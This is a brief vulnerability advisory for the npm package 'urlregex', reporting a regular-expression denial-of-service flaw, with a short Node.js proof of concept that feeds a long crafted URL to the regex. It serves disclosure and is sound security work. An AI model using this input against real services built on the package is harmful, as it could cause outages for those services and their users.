# Overview

urlregex

> No-dependency URL validation for Node and the browser.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). An attacker providing a very long string in `String.test` can cause a Denial of Service.

# PoC

```node
const urlRegex = require('urlregex');
const isValid = urlRegex().test('http://huntr.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321.testvulnerability2312321');
console.log(isValid);
```